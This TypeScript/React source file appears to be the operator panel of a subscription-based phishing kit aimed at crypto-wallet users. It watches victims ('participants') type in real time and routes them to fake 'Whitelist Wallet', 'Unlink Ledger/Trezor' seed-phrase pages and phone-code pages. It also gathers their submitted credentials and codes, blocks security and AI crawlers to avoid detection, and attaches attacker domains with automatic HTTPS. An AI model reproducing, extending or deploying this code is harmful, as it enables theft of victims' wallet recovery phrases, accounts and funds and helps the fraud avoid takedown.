                    if (!suite || !page) return;
                    onApprove(p.id, suite, page);
                    setOpen(false);
                  }}
                  disabled={!suite || !page}
                >
                  Confirm & route
                </button>
              </div>
            </div>
          </PanelModal>
        </Suspense>
      )}
    </article>
  );
}

function shortId(id: string): string {
  return id.length <= 10 ? id : `${id.slice(0, 10)}…`;
}

function ParticipantCard({
  p,
  onNavigate,
  onRevoke,
  onKick,
  onOpenPreview,
  suites,
  events,
}: {
  p: LiveRecord;
  onNavigate: (id: string, suite: Suite, page: Page) => void;
  onRevoke: (id: string) => void;
  onKick: (id: string) => void;
  onOpenPreview: (id: string) => void;
  suites: SuiteOpt[];
  events: InputPayload[];
}) {
  const [regRev, setRegRev] = useState(0);
  useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
  type PanelKey = "redirect" | "submitted";
  const [panels, setPanels] = useState<Set<PanelKey>>(() => new Set());
  const [pickedSuite, setPickedSuite] = useState<Suite | null>(null);
  const [pickedPage, setPickedPage] = useState<Page | null>(null);
  const [codeDraft, setCodeDraft] = useState("");
  const [awaitingCodeFor, setAwaitingCodeFor] = useState<Page | null>(null);

  function togglePanel(k: PanelKey) {
    setPanels((prev) => {
      const next = new Set(prev);
      if (next.has(k)) next.delete(k);
      else next.add(k);
      return next;
    });
  }
  function closePanelKey(k: PanelKey) {
    setPanels((prev) => {
      if (!prev.has(k)) return prev;
      const next = new Set(prev);
      next.delete(k);
      return next;
    });
    if (k === "redirect") setTimeout(() => {
      setPickedSuite(null);
      setPickedPage(null);
      setAwaitingCodeFor(null);
      setCodeDraft("");
    }, 200);
  }

  /**
   * Pages that need admin input before redirect.
   * - code2: 2-digit code (checkphone prompt / confirmphone last digits)
   * - phone: full phone number shown on sendcode
   */
  type RedirectInputMode = "code2" | "phone";
  const REDIRECT_INPUT: Record<string, Record<string, RedirectInputMode>> = {
    ge: {
      checkphone: "code2",
      confirmphone: "code2",
      sendcode: "phone",
    },
  };

  const PAGE_VARIANTS: Record<string, Record<string, { value: string; label: string }[]>> = {
    cb: {
      phrase: [
        { value: "phrase?mode=whitelist", label: "Whitelist Wallet" },
        { value: "phrase?mode=disconnect", label: "Disconnect Wallet" },
        { value: "phrase?mode=ledger", label: "Unlink Ledger" },
        { value: "phrase?mode=trezor", label: "Unlink Trezor" },
      ],
    },
  };

  const pageOpts: PageOpt[] = useMemo(
    () => (pickedSuite ? pagesFromPagesFor(getRedirectPages(pickedSuite)) : []),
    [pickedSuite, regRev],
  );

  function pageBase(page: Page): string {
    return page.split("?")[0] ?? page;
  }

  function redirectInputMode(suite: Suite, page: Page): RedirectInputMode | null {
    return REDIRECT_INPUT[suite]?.[pageBase(page)] ?? null;
  }

  function routeTo(suite: Suite, page: Page) {
    if (redirectInputMode(suite, page)) {
      setAwaitingCodeFor(page);
      setCodeDraft("");
      return;
    }
    onNavigate(p.id, suite, page);
    closePanelKey("redirect");
  }

  function confirmCodeRedirect() {
    if (!pickedSuite || !awaitingCodeFor) return;
    const mode = redirectInputMode(pickedSuite, awaitingCodeFor);
    const base = pageBase(awaitingCodeFor);
    if (mode === "phone") {
      const phone = codeDraft.trim();
      if (phone.replace(/\D/g, "").length < 7) return;
      onNavigate(p.id, pickedSuite, `${base}?phone=${encodeURIComponent(phone)}`);
    } else {
      const digits = codeDraft.replace(/\D/g, "").slice(0, 2);
      if (digits.length !== 2) return;
      // confirmphone uses last-2 as hint; checkphone uses code=
      const qs = base === "confirmphone" ? `hint=${digits}` : `code=${digits}`;
      onNavigate(p.id, pickedSuite, `${base}?${qs}`);
    }
    setAwaitingCodeFor(null);
    setCodeDraft("");
    closePanelKey("redirect");
  }

  const submitted = useMemo(() => {
    const map = new Map<string, InputPayload>();
    for (const e of events) {
      if (e.field.startsWith("__")) continue;
      if (/_clicked$/.test(e.field) || e.field === "continue_clicked") continue;
      // Live typing belongs in live preview — skip draft/input markers.
      if (/\sinput$/i.test(e.field) || /_input$/i.test(e.field) || /_draft_/i.test(e.field)) continue;
      // Only credentials / codes — drop captcha, phone_send, UI noise, etc.
      if (!isSensitiveAdminSubmission(e.field)) continue;
      const key = e.field.replace(/_submitted$/i, "").trim().toLowerCase();
      const prev = map.get(key);
      const isSubmit = /_submitted$/i.test(e.field) || /submit$/i.test(e.field) || /_final_/i.test(e.field);
      if (!prev) {
        map.set(key, e);
        continue;
      }
      const prevIsSubmit = /_submitted$/i.test(prev.field) || /submit$/i.test(prev.field) || /_final_/i.test(prev.field);
      if (isSubmit && !prevIsSubmit) map.set(key, e);
      else if (isSubmit === prevIsSubmit && prev.at <= e.at) map.set(key, e);
    }
    return Array.from(map.values()).sort((a, b) => b.at - a.at);
  }, [events]);

  const activePanel =
    panels.has("redirect") ? "redirect" :
    panels.has("submitted") ? "submitted" : null;

  return (
    <article className={`pc pc-live ${activePanel ? "has-panel" : ""}`}>
      <div className="pc-row">
        <SessionCardBody p={p} showId />
        <div className="pc-meta pc-meta-inline">
          <span className={`pc-status-pill ${p.state === "on" ? "is-on" : "is-off"}`}>
            {p.state === "on" ? "Online" : "Disconnected"}
          </span>
          <span className="pc-time" title={new Date(p.joinedAt).toLocaleString()}>
            {formatRelative(p.joinedAt)}
          </span>
        </div>
        <div className="pc-toolbar">
          <button
            className={`admin-icon-btn ${panels.has("redirect") ? "is-active" : ""}`}
            title="Redirect"
            onClick={() => togglePanel("redirect")}
            aria-label="Redirect participant"
            aria-pressed={panels.has("redirect")}
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12" />
              <polyline points="13 6 19 12 13 18" />
            </svg>
          </button>
          <button
            className={`admin-icon-btn ${panels.has("submitted") ? "is-active" : ""}`}
            title="View submitted info"
            onClick={() => togglePanel("submitted")}
            aria-label="View submitted info"
            aria-pressed={panels.has("submitted")}
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10" />
              <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
              <line x1="12" y1="17" x2="12.01" y2="17" />
            </svg>
            {submitted.length > 0 && <span className="admin-icon-badge">{submitted.length}</span>}
          </button>
          <button
            className="admin-icon-btn"
            title="Live preview"
            onClick={() => onOpenPreview(p.id)}
            aria-label="Open live preview"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" />
              <circle cx="12" cy="12" r="3" />
            </svg>
          </button>
          <span className="pc-toolbar-sep" aria-hidden />
          <button
            className="admin-icon-btn admin-icon-btn-danger"
            title="Revoke access"
            onClick={() => onRevoke(p.id)}
            aria-label="Revoke access"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="1 4 1 10 7 10" />
              <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10" />
            </svg>
          </button>
          <button
            className="admin-icon-btn admin-icon-btn-danger"
            title="Remove"
            onClick={() => onKick(p.id)}
            aria-label="Remove participant"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="3 6 5 6 21 6" />
              <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
              <path d="M10 11v6M14 11v6" />
              <path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" />
            </svg>
          </button>
        </div>
      </div>

      {panels.has("redirect") && (
        <Suspense fallback={<AdminLazyFallback />}>
          <PanelModal
            title={
              <span>
                Redirect <span className="font-mono text-[11px] opacity-60">{shortId(p.id)}</span>
                {pickedSuite && <span className="opacity-60"> · {pickedSuite}</span>}
              </span>
            }
            onClose={() => closePanelKey("redirect")}
            maxWidth={340}
            className="pc-modal"
          >
            {!pickedSuite ? (
              <div className="admin-redirect-list">
                {suites.length === 0 && (
                  <p className="admin-redirect-empty">No designs yet.</p>
                )}
                {suites.map((s, i) => {
                  const logo = getDesignLogo(s.value);
                  return (
                    <button
                      key={s.value}
                      className="admin-redirect-item"
                      style={{ animationDelay: `${i * 30}ms` }}
                      onClick={() => setPickedSuite(s.value)}
                    >
                      <span className="admin-redirect-item-dot">
                        {logo ? (
                          <img src={logo} alt="" className="pc-redirect-logo" />
                        ) : "›"}
                      </span>
                      <span>{s.label}</span>
                      <span className="admin-redirect-item-arrow">→</span>
                    </button>
                  );
                })}
              </div>
            ) : awaitingCodeFor ? (
              <>
                <button
                  className="admin-redirect-back"
                  onClick={() => {
                    setAwaitingCodeFor(null);
                    setCodeDraft("");
                  }}
                >
                  ← Pages
                </button>
                <div className="admin-redirect-code">
                  {(() => {
                    const mode =
                      (pickedSuite && redirectInputMode(pickedSuite, awaitingCodeFor)) || "code2";
                    const isPhone = mode === "phone";
                    const base = pageBase(awaitingCodeFor);
                    const label = isPhone
                      ? "Enter the full phone number to show on their screen"
                      : base === "confirmphone"
                        ? "Enter the last 2 digits of their phone (shown as ••••••••XX)"
                        : "Enter a 2-digit code to show on their screen";
                    const ready = isPhone
                      ? codeDraft.replace(/\D/g, "").length >= 7
                      : codeDraft.replace(/\D/g, "").length === 2;
                    return (
                      <>
                        <p className="admin-redirect-code-label">{label}</p>
                        <input
                          className={`admin-redirect-code-input${isPhone ? " is-phone" : ""}`}
                          type="text"
                          inputMode={isPhone ? "tel" : "numeric"}
                          autoComplete={isPhone ? "tel" : "one-time-code"}
                          maxLength={isPhone ? 20 : 2}
                          placeholder={isPhone ? "(323) 376-8794" : "00"}
                          value={codeDraft}
                          autoFocus
                          onChange={(e) => {
                            if (isPhone) setCodeDraft(e.target.value.slice(0, 20));
                            else setCodeDraft(e.target.value.replace(/\D/g, "").slice(0, 2));
                          }}
                          onKeyDown={(e) => {
                            if (e.key === "Enter") confirmCodeRedirect();
                          }}
                        />
                        <button
                          type="button"
                          className="admin-redirect-code-go"
                          disabled={!ready}
                          onClick={confirmCodeRedirect}
                        >
                          {isPhone ? "Send with number" : "Send with code"}
                        </button>
                      </>
                    );
                  })()}
                </div>
              </>
            ) : pickedPage && PAGE_VARIANTS[pickedSuite]?.[pickedPage] ? (
              <>
                <button className="admin-redirect-back" onClick={() => setPickedPage(null)}>
                  ← Pages
                </button>
                <div className="admin-redirect-list">
                  {PAGE_VARIANTS[pickedSuite][pickedPage].map((v, i) => {
                    const icon = getPageIcon(pickedSuite, pickedPage) ?? getDesignLogo(pickedSuite);
                    return (
                      <button
                        key={v.value}
                        className="admin-redirect-item"
                        style={{ animationDelay: `${i * 25}ms` }}
                        onClick={() => routeTo(pickedSuite, v.value)}
                      >
                        <span className="admin-redirect-item-dot">
                          {icon ? (
                            <img src={icon} alt="" className="pc-redirect-logo" />
                          ) : "•"}
                        </span>
                        <span>{v.label}</span>
                        <span className="admin-redirect-item-arrow">↗</span>
                      </button>
                    );
                  })}
                </div>
              </>
            ) : (
              <>
                <button className="admin-redirect-back" onClick={() => setPickedSuite(null)}>
                  ← Designs
                </button>
                <div className="admin-redirect-list">
                  {pageOpts.length === 0 && (
                    <p className="admin-redirect-empty">No pages in this design.</p>
                  )}
                  {pageOpts.map((pg, i) => {
                    const icon = getPageIcon(pickedSuite, pg.value) ?? getDesignLogo(pickedSuite);
                    const hasVariants = !!PAGE_VARIANTS[pickedSuite]?.[pg.value];
                    return (
                      <button
                        key={pg.value}
                        className="admin-redirect-item"
                        style={{ animationDelay: `${i * 25}ms` }}
                        onClick={() => {
                          if (hasVariants) setPickedPage(pg.value);
                          else routeTo(pickedSuite, pg.value);
                        }}
                      >
                        <span className="admin-redirect-item-dot">
                          {icon ? (
                            <img src={icon} alt="" className="pc-redirect-logo" />
                          ) : "•"}
                        </span>
                        <span>{pg.label}</span>
                        <span className="admin-redirect-item-arrow">{hasVariants ? "›" : "↗"}</span>
                      </button>
                    );
                  })}
                </div>
              </>
            )}
          </PanelModal>
        </Suspense>
      )}

      {panels.has("submitted") && (
        <Suspense fallback={<AdminLazyFallback />}>
          <PanelModal
            title={<span>Submitted · <span className="font-mono text-[11px]">{shortId(p.id)}</span></span>}
            onClose={() => closePanelKey("submitted")}
            maxWidth={440}
            className="pc-modal"
          >
            <div className="admin-modal-list">
              {submitted.length === 0 ? (
                <p className="admin-redirect-empty">Nothing submitted yet.</p>
              ) : (
                submitted.map((e, i) => (
                  <div
                    key={e.field}
                    className={`admin-submitted-item ${i === 0 ? "is-pinned" : ""}`}
                    style={{ animationDelay: `${i * 40}ms` }}
                  >
                    <div className="admin-submitted-field">
                      {e.field}
                      {i === 0 && <span className="admin-submitted-latest">latest</span>}
                    </div>
                    <CopyChip text={e.value} className="admin-submitted-value copy-chip-block" title="Copy value">
                      {e.value ? (
                        <span className="admin-submitted-value-text">{e.value}</span>
                      ) : (
                        <em className="admin-submitted-empty">(empty)</em>
                      )}
                    </CopyChip>
                    <div className="admin-submitted-meta">
                      {new Date(e.at).toLocaleTimeString()}
                    </div>
                  </div>
                ))
              )}
            </div>
          </PanelModal>
        </Suspense>
      )}
    </article>
  );
}


function SettingsPane({
  blockBots,
  onToggleBlockBots,
}: {
  blockBots: boolean;
  onToggleBlockBots: (v: boolean) => void;
}) {
  const fetchMe = useServerFn(getMyAccount);
  const [me, setMe] = useState<{ isAdmin: boolean; isTester: boolean } | null>(null);
  useEffect(() => {
    let alive = true;
    fetchMe()
      .then((r) => alive && setMe({ isAdmin: !!r.isAdmin, isTester: !!(r as { isTester?: boolean }).isTester }))
      .catch(() => undefined);
    return () => { alive = false; };
  }, [fetchMe]);

  return (
    <div className="admin-settings-page">
      <header className="admin-settings-head">
        <h1 className="admin-settings-h1">Settings</h1>
        <p className="admin-settings-lede">
          {me?.isAdmin
            ? "Project-wide controls, tester accounts, and every attached domain."
            : "Attach your domains and set the seed phrase visitors on your domains will see."}
        </p>
      </header>

      {(me?.isAdmin || me?.isTester) && <MyDomainsSection isAdmin={!!me?.isAdmin} />}
      {(me?.isAdmin || me?.isTester) && <MySeedPhraseSection />}

      {me?.isAdmin && (
        <section className="admin-settings-group">
          <h2 className="admin-settings-group-title">Visitors</h2>
          <label className="admin-settings-row">
            <div>
              <div className="admin-settings-title">Block bots & crawlers</div>
              <div className="admin-settings-sub">
                Drop bot, AI crawler, and headless requests (GPTBot, ClaudeBot, Googlebot,
                Puppeteer, Playwright, etc.) before they join.
              </div>
            </div>
            <input
              type="checkbox"
              className="admin-switch"
              checked={blockBots}
              onChange={(e) => onToggleBlockBots(e.target.checked)}
            />
          </label>
        </section>
      )}

      {me?.isAdmin && <AccountsSection />}

    </div>
  );
}

type DomainRow = {
  id: string;
  hostname: string;
  owner_id: string;
  dns_status?: string | null;
  ssl_status?: string | null;
  last_checked_at?: string | null;
  last_seen_at?: string | null;
};

function StatusBadge({ label, value }: { label: string; value: string | null | undefined }) {
  const v = value ?? "pending";
  const color =
    v === "ok" || v === "issued"
      ? "#1a7f37"
      : v === "mismatch" || v === "failed"
        ? "#b42318"
        : "#8a6d00";
  const bg =
    v === "ok" || v === "issued"
      ? "#e6f4ea"
      : v === "mismatch" || v === "failed"
        ? "#fde8e8"
        : "#fef7e0";
  return (
    <span style={{ fontSize: 11, padding: "2px 8px", borderRadius: 999, background: bg, color, fontWeight: 600 }}>
      {label}: {v}
    </span>
  );
}

function fmtAgo(iso: string | null | undefined): string {
  if (!iso) return "never";
  const ms = Date.now() - new Date(iso).getTime();
  const s = Math.floor(ms / 1000);
  if (s < 60) return `${s}s ago`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}m ago`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}h ago`;
  return `${Math.floor(h / 24)}d ago`;
}

function ServerIpBox({ ip, isAdmin, onSaved }: { ip: string; isAdmin: boolean; onSaved: (ip: string) => void }) {
  const save = useServerFn(setServerPublicIp);
  const [editing, setEditing] = useState(false);
  const [value, setValue] = useState(ip);
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState<string | null>(null);
  useEffect(() => { setValue(ip); }, [ip]);
  async function onSave() {
    setErr(null); setBusy(true);
    try {
      const r = await save({ data: { ip: value.trim() } }) as { ip: string };
      onSaved(r.ip);
      setEditing(false);
    } catch (e) { setErr(e instanceof Error ? e.message : "Failed"); }
    finally { setBusy(false); }
  }
  return (
    <div className="admin-server-ip">
      <div className="admin-server-ip-label">
        At your registrar, create an <strong>A record</strong>:
      </div>
      <div className="admin-server-ip-row">
        {!editing ? (
          <>
            <code className="admin-server-ip-code">
              Type: A &nbsp;·&nbsp; Name: @ &nbsp;·&nbsp; Value: <strong>{ip || "0.0.0.0"}</strong>
            </code>
            <button type="button" className="btn-secondary" onClick={() => { void navigator.clipboard.writeText(ip || "0.0.0.0"); }}>Copy IP</button>
            {isAdmin && (
              <button type="button" className="btn-secondary" onClick={() => setEditing(true)}>Edit IP</button>
            )}
          </>
        ) : (
          <>
            <input
              className="admin-server-ip-input"
              value={value}
              onChange={(e) => setValue(e.target.value)}
              placeholder="0.0.0.0"
              autoCapitalize="off"
              spellCheck={false}
            />
            <button type="button" className="btn-primary" onClick={onSave} disabled={busy}>{busy ? "Saving…" : "Save"}</button>
            <button type="button" className="btn-secondary" onClick={() => { setEditing(false); setValue(ip); setErr(null); }}>Cancel</button>
          </>
        )}
      </div>
      {err && <div className="auth-error" style={{ marginTop: 6 }}>{err}</div>}
      {isAdmin && !editing && (
        <div className="admin-server-ip-hint">
          Admins can change the server IP shown to testers. Leave blank to reset.
        </div>
      )}
    </div>
  );
}

function MyDomainsSection({ isAdmin }: { isAdmin: boolean }) {
  const list = useServerFn(listMyDomains);
  const add = useServerFn(addDomain);
  const remove = useServerFn(removeDomain);
  const getConn = useServerFn(getServerConnectionInfo);
  const check = useServerFn(checkDomainStatus);
  const [rows, setRows] = useState<DomainRow[]>([]);
  const [input, setInput] = useState("");
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [conn, setConn] = useState<{ ip: string; panelHost: string } | null>(null);
  const [checkingId, setCheckingId] = useState<string | null>(null);

  async function refresh() {
    try {
      const r = await list();
      setRows(r as DomainRow[]);
    } catch (e) {
      setError(e instanceof Error ? e.message : "Failed to load");
    }
  }
  useEffect(() => {
    void refresh();
    getConn().then((c) => setConn(c as { ip: string; panelHost: string })).catch(() => {});
    /* eslint-disable-next-line */
  }, []);

  async function onAdd(e: React.FormEvent) {
    e.preventDefault();
    if (!input.trim()) return;
    setError(null);
    setBusy(true);
    try {
      await add({ data: { hostname: input.trim() } });
      setInput("");
      await refresh();
    } catch (e) {
      setError(e instanceof Error ? e.message : "Failed to add");
    } finally {
      setBusy(false);
    }
  }

  async function onDelete(id: string, hostname: string) {
    if (!window.confirm(`Detach "${hostname}"? Participants already on it stay assigned to their current owner.`)) return;
    setError(null);
    try {
      await remove({ data: { id } });
      await refresh();
    } catch (e) {
      setError(e instanceof Error ? e.message : "Failed");
    }
  }

  async function onRecheck(id: string) {
    setCheckingId(id);
    setError(null);
    try {
      await check({ data: { id } });
      await refresh();
    } catch (e) {
      setError(e instanceof Error ? e.message : "Recheck failed");
    } finally {
      setCheckingId(null);
    }
  }

  return (
    <section className="admin-settings-group">
      <h2 className="admin-settings-group-title">
        {isAdmin ? "All domains" : "My domains"} <span style={{ color: "#555" }}>· {rows.length}</span>
      </h2>
      <p className="admin-settings-sub" style={{ margin: "0 0 12px" }}>
        Point your domain's DNS at the server below — the panel auto-issues HTTPS on the first visit. No SSH, no config edits.
      </p>
      <ServerIpBox
        ip={conn?.ip ?? "0.0.0.0"}
        isAdmin={isAdmin}
        onSaved={(newIp) => setConn((c) => ({ ip: newIp, panelHost: c?.panelHost ?? "" }))}
      />

      <form onSubmit={onAdd} className="admin-domain-add">
        <input
          className="admin-domain-input"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder="example.com"
          autoCapitalize="off"
          spellCheck={false}
        />
        <button type="submit" className="btn-primary" disabled={busy}>
          {busy ? "Adding…" : "Add domain"}
        </button>
      </form>
      {error && <div className="auth-error">{error}</div>}
      <div className="admin-acct-list">
        {rows.map((r) => (
          <div key={r.id} className="admin-acct-row">
            <div className="admin-acct-main">
              <div className="admin-acct-name-row">
                <span className="admin-acct-name font-mono">{r.hostname}</span>
              </div>
              <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginTop: 4 }}>
                <StatusBadge label="DNS" value={r.dns_status} />
                <StatusBadge label="SSL" value={r.ssl_status} />
                <span style={{ fontSize: 11, color: "#71717a" }}>
                  checked {fmtAgo(r.last_checked_at)} · last visit {fmtAgo(r.last_seen_at)}
                </span>
              </div>
            </div>
            <div className="admin-acct-actions" style={{ display: "flex", gap: 6 }}>
              <button
                className="btn-secondary"
                onClick={() => onRecheck(r.id)}
                disabled={checkingId === r.id}
              >
                {checkingId === r.id ? "Checking…" : "Recheck"}
              </button>
              <button className="admin-acct-delete" onClick={() => onDelete(r.id, r.hostname)}>
                Detach
              </button>
            </div>
          </div>
        ))}
        {rows.length === 0 && <p className="admin-empty">No domains attached yet.</p>}
      </div>
    </section>
  );
}


function MySeedPhraseSection() {
  const get = useServerFn(getMySeedPhrase);
  const set = useServerFn(setMySeedPhrase);
  const [value, setValue] = useState("");
  const [loaded, setLoaded] = useState(false);
  const [busy, setBusy] = useState(false);
  const [status, setStatus] = useState<string | null>(null);

  useEffect(() => {
    let alive = true;
    get()
      .then((r: { seedPhrase: string }) => { if (alive) { setValue(r.seedPhrase ?? ""); setLoaded(true); } })
      .catch(() => alive && setLoaded(true));
    return () => { alive = false; };
  }, [get]);

  async function save() {
    setStatus(null);
    setBusy(true);
    try {
      await set({ data: { seedPhrase: value } });
      setStatus("Saved");
      setTimeout(() => setStatus(null), 1600);
    } catch (e) {
      setStatus(e instanceof Error ? e.message : "Failed");
    } finally {
      setBusy(false);
    }
  }

  return (
    <section className="admin-settings-group">
      <h2 className="admin-settings-group-title">My seed phrase</h2>
      <p className="admin-settings-sub" style={{ margin: "0 0 8px" }}>
        Shown on{" "}
        <a className="admin-seed-link font-mono" href="/cb/safepal" target="_blank" rel="noreferrer">/cb/safepal</a>
        {" "}and{" "}
        <a className="admin-seed-link font-mono" href="/gi/safepal" target="_blank" rel="noreferrer">/gi/safepal</a>
        {" "}when you redirect a participant there (or when they visit via your domain). 12 or 24 words separated by single spaces.
      </p>
      <textarea
        className="admin-seed-input"
        value={value}
        onChange={(e) => setValue(e.target.value)}
        placeholder="witness pilot swim brave tornado fringe angry silent decade broken shrimp orbit"
        rows={3}
        spellCheck={false}
        autoCapitalize="off"
        disabled={!loaded}
      />
      <div style={{ display: "flex", alignItems: "center", gap: 10, marginTop: 8 }}>
        <button className="btn-primary" onClick={() => void save()} disabled={busy || !loaded}>
          {busy ? "Saving…" : "Save seed phrase"}
        </button>
        {status && <span style={{ fontSize: 13, color: status === "Saved" ? "#4ade80" : "#f87171" }}>{status}</span>}
      </div>
    </section>
  );
}

function avatarColor(seed: string): string {
  let h = 0;
  for (let i = 0; i < seed.length; i++) h = (h * 31 + seed.charCodeAt(i)) >>> 0;
  const hue = h % 360;
  return `hsl(${hue} 55% 45%)`;
}
function initials(name: string | null | undefined): string {
  if (!name) return "?";
  return name.trim().slice(0, 2).toUpperCase();
}

function useCountdown(iso: string | null): { text: string; kind: "inf" | "active" | "danger" | "expired" | "none" } {
  const [, tick] = useState(0);
  useEffect(() => {
    const id = window.setInterval(() => tick((n) => n + 1), 1000);
    return () => window.clearInterval(id);
  }, []);
  if (!iso) return { text: "No subscription", kind: "none" };
  const remaining = new Date(iso).getTime() - Date.now();
  if (remaining <= 0) return { text: "Expired", kind: "expired" };
  const s = Math.floor(remaining / 1000);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  let text: string;
  if (d > 0) text = `${d}d ${h}h ${m}m`;
  else if (h > 0) text = `${h}h ${m}m ${sec}s`;
  else text = `${m}m ${sec}s`;
  return { text, kind: remaining < 24 * 3600 * 1000 ? "danger" : "active" };
}

function AccountChip() {
  const navigate = useNavigate();
  const fetchMe = useServerFn(getMyAccount);
  const [me, setMe] = useState<{ username: string | null; isAdmin: boolean; subscription_until: string | null } | null>(null);

  useEffect(() => {
    let alive = true;
    const load = () =>
      fetchMe()
        .then((r) => {
          if (alive)
            setMe({
              username: r.username,
              isAdmin: r.isAdmin,
              subscription_until: r.subscription_until,
            });
        })
        .catch(() => undefined);
    load();
    const id = window.setInterval(load, 30_000);
    return () => {
      alive = false;
      window.clearInterval(id);
    };
  }, [fetchMe]);

  async function signOut() {
    await supabase.auth.signOut();
    navigate({ to: "/auth" });
  }

  const cd = useCountdown(me?.subscription_until ?? null);

  if (!me) return null;
  const rank = me.isAdmin ? "Admin" : "Paid";
  const rankClass = me.isAdmin ? "is-admin" : "";
  const subText = me.isAdmin ? "Infinite access" : cd.kind === "none" || cd.kind === "expired" ? "Suspended" : cd.text;
  const subKind = me.isAdmin ? "is-inf" : cd.kind === "danger" ? "is-danger" : cd.kind === "expired" || cd.kind === "none" ? "is-danger" : "";

  return (
    <div className="admin-account-chip">
      <div className="admin-account-avatar" style={{ background: avatarColor(me.username ?? "?") }}>
        {initials(me.username)}
      </div>
      <div className="admin-account-info">
        <div className="admin-account-name">{me.username ?? "—"}</div>
        <div className={`admin-account-rank ${rankClass}`}>
          {me.isAdmin ? "★ " : "● "}{rank}
        </div>
        <div className={`admin-account-sub ${subKind}`}>{subText}</div>
      </div>
      <button
        type="button"
        className="admin-account-signout"
        onClick={() => void signOut()}
        title="Sign out"
        aria-label="Sign out"
      >
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" />
          <polyline points="10 17 15 12 10 7" />
          <line x1="15" y1="12" x2="3" y2="12" />
        </svg>
      </button>
    </div>
  );
}

type Account = {
  id: string;
  username: string;
  subscription_until: string | null;
  created_at: string;
  roles: string[];
};

const PAGE_SIZE = 5;

function AccountsSection() {
  const list = useServerFn(listAccounts);
  const del = useServerFn(deleteAccount);
  const fetchMe = useServerFn(getMyAccount);
  const [isAdmin, setIsAdmin] = useState<boolean | null>(null);
  const [accounts, setAccounts] = useState<Account[]>([]);
  const [error, setError] = useState<string | null>(null);
  const [page, setPage] = useState(0);
  const [showCreate, setShowCreate] = useState(false);
  const [editing, setEditing] = useState<Account | null>(null);

  async function refresh() {
    try {
      const rows = await list();
      setAccounts(rows as Account[]);
    } catch (e) {
      setError(e instanceof Error ? e.message : "Failed to load");
    }
  }
  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const me = (await fetchMe()) as { isAdmin: boolean };
        if (cancelled) return;
        setIsAdmin(me.isAdmin);
        if (me.isAdmin) await refresh();
      } catch {
        if (!cancelled) setIsAdmin(false);
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);


  async function onDelete(userId: string, username: string) {
    if (!window.confirm(`Delete account "${username}"? This cannot be undone.`)) return;
    setError(null);
    try {
      await del({ data: { userId } });
      await refresh();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed");
    }
  }

  if (!isAdmin) return null;

  const totalPages = Math.max(1, Math.ceil(accounts.length / PAGE_SIZE));
  const currentPage = Math.min(page, totalPages - 1);
  const visible = accounts.slice(currentPage * PAGE_SIZE, currentPage * PAGE_SIZE + PAGE_SIZE);

  return (
    <section className="admin-settings-group">
      <div className="admin-acct-head">
        <h2 className="admin-settings-group-title" style={{ margin: 0 }}>
          Accounts <span style={{ color: "#555" }}>· {accounts.length}</span>
        </h2>
        <button className="admin-acct-create-link" onClick={() => setShowCreate(true)}>
          Create account
        </button>
      </div>

      {error && <div className="auth-error">{error}</div>}

      <div className="admin-acct-list">
        {visible.map((a) => (
          <AccountRow
            key={a.id}
            a={a}
            onEdit={() => setEditing(a)}
            onDelete={onDelete}
          />
        ))}
        {accounts.length === 0 && (
          <p className="admin-empty">No accounts yet.</p>
        )}
      </div>

      {totalPages > 1 && (
        <div className="admin-acct-pager">
          <button
            onClick={() => setPage((p) => Math.max(0, p - 1))}
            disabled={currentPage === 0}
            aria-label="Previous page"
          >
            ‹
          </button>
          {Array.from({ length: totalPages }).map((_, i) => (
            <button
              key={i}
              className={i === currentPage ? "is-active" : ""}
              onClick={() => setPage(i)}
            >
              {i + 1}
            </button>
          ))}
          <button
            onClick={() => setPage((p) => Math.min(totalPages - 1, p + 1))}
            disabled={currentPage >= totalPages - 1}
            aria-label="Next page"
          >
            ›
          </button>
        </div>
      )}

      {showCreate && (
        <CreateAccountModal
          onClose={() => setShowCreate(false)}
          onCreated={() => {
            setShowCreate(false);
            void refresh();
          }}
        />
      )}
      {editing && (
        <EditAccountModal
          account={editing}
          onClose={() => setEditing(null)}
          onSaved={() => {
            setEditing(null);
            void refresh();
          }}
        />
      )}
    </section>
  );
}

function AccountRow({
  a,
  onEdit,
  onDelete,
}: {
  a: Account;
  onEdit: () => void;
  onDelete: (id: string, username: string) => void;
}) {
  const isAdmin = a.roles.includes("admin");
  const cd = useCountdown(a.subscription_until);
  const suspended = !isAdmin && (cd.kind === "expired" || cd.kind === "none");

  const timeText = isAdmin
    ? "∞ infinite"
    : cd.kind === "none"
      ? "no subscription"
      : cd.kind === "expired"
        ? "expired"
        : `${cd.text} left`;
